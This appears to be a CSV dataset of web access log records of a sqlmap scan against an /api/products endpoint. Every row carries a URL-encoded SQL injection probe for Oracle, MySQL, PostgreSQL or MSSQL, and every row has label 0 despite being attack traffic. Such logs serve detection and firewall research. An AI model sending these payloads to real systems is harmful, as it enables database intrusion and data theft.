@timestamp,auth_token_hash,method,path,path_normalized,remote_ip,request_id,response_size,response_time_ms,sampling_flag,status,upstream,user_agent,user_id_hash,user_role,waf_action,waf_rule_id,label
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%25%27%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27hdGg%25%27%3D%27hdGg,/api/products,172.20.0.10,e9d7d1075544480d5f1606cf7eef2860,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%27%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%27wvjP%27%20LIKE%20%27wvjP,/api/products,172.20.0.10,373b8d6e1b49e830fd85b6de1a81e336,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%22%29%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%22VbJh%22%3D%22VbJh,/api/products,172.20.0.10,4fa5e2b67ee8dd4f62c96b93dd4e9439,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%22%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%22PmdQ%22%3D%22PmdQ,/api/products,172.20.0.10,0e7c4b88bfd583b8c18e8721affa7b0e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%29%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%286843%3D6843,/api/products,172.20.0.10,247a8c7fe65fc8f8125403b6f064e67d,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:18+00:00,(empty),GET,/api/products?q=a%29%29%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29%20AND%20%28%285868%3D5868,/api/products,172.20.0.10,b42247bca4be626696589aca01231914,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29,/api/products,172.20.0.10,cd37f73b6c02c269b0c16a4fb186a689,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20AND%203289%3D%28SELECT%20UPPER%28XMLType%28CHR%2860%29%7C%7CCHR%2858%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%283289%3D3289%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%7C%7CCHR%2862%29%29%29%20FROM%20DUAL%29--%20xDVV,/api/products,172.20.0.10,35bd9ca0e573063e17b63a5f128b8176,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%28%27xbdk%27%3D%27xbdk,/api/products,172.20.0.10,456545b41316ffff4e21895d3fb96532,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%28%28%27KEis%27%3D%27KEis,/api/products,172.20.0.10,31d260bf9b9cd55be80993b1939eac8a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%27qxMB%27%3D%27qxMB,/api/products,172.20.0.10,14bb7dad2f25777eb6e1968aa5c7a9f6,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%28%27vgXI%27%20LIKE%20%27vgXI,/api/products,172.20.0.10,b80b944623706b108be2c2e73e44003b,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%25%27%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%27XhZa%25%27%3D%27XhZa,/api/products,172.20.0.10,ed47f954620587c3003ab188d7bf6c44,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%27JGfa%27%20LIKE%20%27JGfa,/api/products,172.20.0.10,89492c5d4c1a79c26fdfdc7bde8612e2,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%28%22QRoq%22%3D%22QRoq,/api/products,172.20.0.10,4b6fb3455b6eb03b141a541baf1ace5a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%22Slfz%22%3D%22Slfz,/api/products,172.20.0.10,0f4c7a69fa9c93f59999cf2d6fbb8798,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%285106%3D5106,/api/products,172.20.0.10,3287686b3aab885a478c354b446068bd,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%29%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AND%20%28%289245%3D9245,/api/products,172.20.0.10,f8eeefd88a7dfa3fb5a28b10c76a1092,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29,/api/products,172.20.0.10,83d8c4697cce55b3b552d2781ac2ae58,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20AND%204563%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%284563%3D4563%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29--%20eJFx,/api/products,172.20.0.10,643fdd4c8249550733266fba7fdff4f0,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%28%27CrVF%27%3D%27CrVF,/api/products,172.20.0.10,1e91b93aa345ad219e2f2a82da9e8ed2,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%28%28%27WEeD%27%3D%27WEeD,/api/products,172.20.0.10,877d935eec1f31a3faeae351959edefb,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%27bCvN%27%3D%27bCvN,/api/products,172.20.0.10,bd2239b31e07cf95d46ce3719c6b2131,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%28%27AROx%27%20LIKE%20%27AROx,/api/products,172.20.0.10,b922e57d7c87d4b72636855736ba0605,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%25%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%27hGEA%25%27%3D%27hGEA,/api/products,172.20.0.10,c87d5070a7fe5c1a7865319bbb0ecf5c,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%27Yerc%27%20LIKE%20%27Yerc,/api/products,172.20.0.10,641cc816abc745b81055e5d1e3715f06,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%28%22vPXY%22%3D%22vPXY,/api/products,172.20.0.10,0c6a2b7f66daf1d927c50809c75aea47,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%22%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%22iDcH%22%3D%22iDcH,/api/products,172.20.0.10,e85e0c061808b50029bb39fbd2e9dd4a,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%287244%3D7244,/api/products,172.20.0.10,0679c946d0c97c3309fc39ff77c5aff7,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%29%29%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29%20AND%20%28%282431%3D2431,/api/products,172.20.0.10,c74cdcf24ad37e32e9c8bb1cb414d6ca,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29,/api/products,172.20.0.10,78d0c44290c1a32b8cf4f1a0b7e06a85,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%20PROCEDURE%20ANALYSE%28EXTRACTVALUE%286242%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28CASE%20WHEN%20%286242%3D6242%29%20THEN%201%20ELSE%200%20END%29%29%2C0x717a717671%29%29%2C1%29--%20fGGT,/api/products,172.20.0.10,c2aacb9cc90cf6a07b0d5f048b7c410e,0.0,2.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=%28SELECT%208973%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7176767071%2C%28SELECT%20%28ELT%288973%3D8973%2C1%29%29%29%2C0x717a717671%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.PLUGINS%20GROUP%20BY%20x%29a%29,/api/products,172.20.0.10,ebdad2bc8bfb6a073420294e7024196e,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=%28EXTRACTVALUE%282899%2CCONCAT%280x5c%2C0x7176767071%2C%28SELECT%20%28ELT%282899%3D2899%2C1%29%29%29%2C0x717a717671%29%29%29,/api/products,172.20.0.10,26394b31f6b577cc13cce48927267015,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=%28CAST%28%28CHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28118%29%7C%7CCHR%28112%29%7C%7CCHR%28113%29%29%7C%7C%28SELECT%20%28CASE%20WHEN%20%286572%3D6572%29%20THEN%201%20ELSE%200%20END%29%29%3A%3Atext%7C%7C%28CHR%28113%29%7C%7CCHR%28122%29%7C%7CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29%20AS%20NUMERIC%29%29,/api/products,172.20.0.10,c90f39e443c38051f09f7fed3c243d46,0.0,4.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,4e8149eaac88c79bdfa298de2167214a,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%29%29%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,c80691e030ab027c19ef8cabfe319859,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%27%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,91af041ccc751111a931dc9b84fe39fb,0.0,3.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
2026-05-05 02:43:19+00:00,(empty),GET,/api/products?q=a%25%27%3BDECLARE%20%40TpQY%20NVARCHAR%284000%29%3BSET%20%40TpQY%3D%28SELECT%20%27qvvpq%27%2B%28SELECT%20%28CASE%20WHEN%20%289685%3D9685%29%20THEN%20%271%27%20ELSE%20%270%27%20END%29%29%2B%27qzqvq%27%29%3BEXEC%20%40TpQY--,/api/products,172.20.0.10,4bf6561d8b3716c42aa53aec30820e02,0.0,6.0,0,307,172.20.0.9:8002,sqlmap/1.8.4#stable (https://sqlmap.org),(empty),GUEST,0,0,0
